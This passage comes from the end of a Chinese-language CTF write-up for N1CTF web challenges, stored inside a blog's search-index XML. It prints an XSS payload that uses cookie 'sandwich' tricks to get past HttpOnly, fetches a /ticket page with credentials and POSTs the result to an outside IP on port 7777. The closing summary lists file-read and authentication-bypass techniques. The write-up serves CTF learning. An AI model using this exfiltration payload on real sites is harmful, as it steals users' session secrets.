class="hljs-string">`$Version=1; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`ticket=&quot;abc; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`aaa=bbb&quot;; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=/;`</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/ticket&quot;</span>, &#123;<br>        <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://xxx.xx.xx.xxx:7777/&quot;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-attr">body</span>: data,<br>        &#125;);<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915205435704.png" alt="image-20250915205435704"></p><p>因为在访问&#x2F;ticket的时候会回显自己的ticket的值，再把请求结果拿出来传到自己的服务器上就能看到flag了</p><h2 id="分析"><a href="/2025/09/15/n1ctf-web-wp/#分析" class="headerlink" title="分析"></a>分析</h2><p>这题比赛中没打出来，当时想到了xss，但是看到httponly不知道有三明治攻击这个东西，也没注意到写错了</p><p>并且也没仔细去阅读代码，nginx的配置文件没认真看</p><h1 id="总结"><a href="/2025/09/15/n1ctf-web-wp/#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>分析解析差异之类的题目时要耐下心来去翻源代码</li><li>&#x2F;proc&#x2F;self&#x2F;maps存放进程的内存地址，&#x2F;proc&#x2F;self&#x2F;mem文件存在不可读部分，不能直接读</li><li>unzip -o解压可以利用软链接实现任意文件读取</li><li>三明治攻击可以绕过httpOnly，nginx配置文件也会有关键信息，利用缓存绕过了身份验证</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>base64解码差异</tag>
      
      <tag>/proc/self/maps&amp;mem文件</tag>
      
      <tag>wp</tag>
      
      <tag>xss三明治攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
